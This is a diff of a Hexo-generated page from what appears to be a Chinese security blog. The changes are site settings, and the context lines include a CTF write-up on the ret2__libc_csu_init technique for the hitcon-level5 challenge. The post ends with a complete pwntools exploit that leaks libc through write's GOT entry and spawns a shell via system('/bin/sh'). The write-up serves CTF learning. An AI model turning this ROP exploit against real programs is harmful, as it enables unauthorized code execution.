@@ -8,6 +8,7 @@
   <link rel="apple-touch-icon" sizes="180x180" href="/images/prof.jpg">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/prof.jpg">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/prof.jpg">
+  <meta name="msvalidate.01" content="E8B6DE7DCFB7B9BA2CD14AB2A553B0EB">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -17,7 +18,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"qi4l.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":"ture","height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"qi4l.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":"ture","height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="前言随记">
 <meta property="og:type" content="article">
@@ -93,7 +94,7 @@
       <p class="site-title">QI4L的沉思录</p>
       <i class="logo-line"></i>
     </a>
-      <p class="site-subtitle" itemprop="description">千里之行，始于足下</p>
+      <p class="site-subtitle" itemprop="description">VMP,反病毒,hook,syscall,逆向</p>
   </div>
 
   <div class="site-nav-right">
@@ -163,10 +164,7 @@
 </div>
   <div class="links-of-author animated">
       <span class="links-of-author-item">
-        <a href="https://github.com/qi4L" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qi4L" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:nuxm771@163.com" title="E-Mail → mailto:nuxm771@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FpNEw=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qi4L"><i class="fab fa-github fa-fw"></i>GitHub</span>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="rss → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i>rss</a>
@@ -254,7 +252,7 @@
     <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随记</p>
 <span id="more"></span>
 
-<p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5">示例文件</a></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9zdGFja292ZXJmbG93L3JldDJfX2xpYmNfY3N1X2luaXQvaGl0Y29uLWxldmVsNQ==">示例文件<i class="fa fa-external-link-alt"></i></span></p>
 <h1 id="64位传参（函数调用约定）"><a href="#64位传参（函数调用约定）" class="headerlink" title="64位传参（函数调用约定）"></a>64位传参（函数调用约定）</h1><p>首先说一下64位文件的传参方式：</p>
 <p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</p>
 <p>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样</p>
@@ -336,9 +334,9 @@
 <p>完整的exp如下：</p>
 <figure class="highlight python"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1345756">https://cloud.tencent.com/developer/article/1345756</a>;</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/king_cpp_py/article/details/79483152">https://blog.csdn.net/king_cpp_py/article/details/79483152</a>;</p>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/u239977/cbzkn3/vty6x0">https://www.yuque.com/u239977/cbzkn3/vty6x0</a>;</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzQ1NzU2">https://cloud.tencent.com/developer/article/1345756<i class="fa fa-external-link-alt"></i></span>;</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdfY3BwX3B5L2FydGljbGUvZGV0YWlscy83OTQ4MzE1Mg==">https://blog.csdn.net/king_cpp_py/article/details/79483152<i class="fa fa-external-link-alt"></i></span>;</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL3UyMzk5NzcvY2J6a24zL3Z0eTZ4MA==">https://www.yuque.com/u239977/cbzkn3/vty6x0<i class="fa fa-external-link-alt"></i></span>;</p>
 
     </div>
 
